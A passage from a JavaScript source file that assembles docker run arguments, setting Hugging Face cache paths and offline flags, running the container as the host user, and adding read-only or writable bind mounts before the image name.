    `HF_HOME=${process.env.HF_HOME || '/home/node/.cache/huggingface'}`,
    '-e',
    `SENTENCE_TRANSFORMERS_HOME=${
      process.env.SENTENCE_TRANSFORMERS_HOME || '/home/node/.cache/sentence-transformers'
    }`,
    // #923 M2: the model cache is mounted READ-ONLY (host pre-warms it before
    // launch). Load offline so huggingface_hub/transformers read the warm cache
    // without attempting lock-file or network (ETag) writes that would raise on
    // the read-only mount and silently degrade semantic retrieval to FTS.
    '-e',
    'HF_HUB_OFFLINE=1',
    '-e',
    'TRANSFORMERS_OFFLINE=1',
  );

  // Run as host user so bind-mounted files are accessible.
  // Skip when running as root (uid 0), as the container's node user (uid 1000),
  // or when getuid is unavailable (native Windows without WSL).
  const hostUid = process.getuid?.();
  const hostGid = process.getgid?.();
  if (hostUid != null && hostUid !== 0 && hostUid !== 1000) {
    args.push('--user', `${hostUid}:${hostGid}`);
    args.push('-e', 'HOME=/home/node');
  }

  for (const mount of mounts) {
    if (mount.readonly) {
      args.push(...readonlyMountArgs(mount.hostPath, mount.containerPath));
    } else {
      args.push('-v', `${mount.hostPath}:${mount.containerPath}`);
    }
  }

  args.push(CONTAINER_IMAGE);

  return args;
}
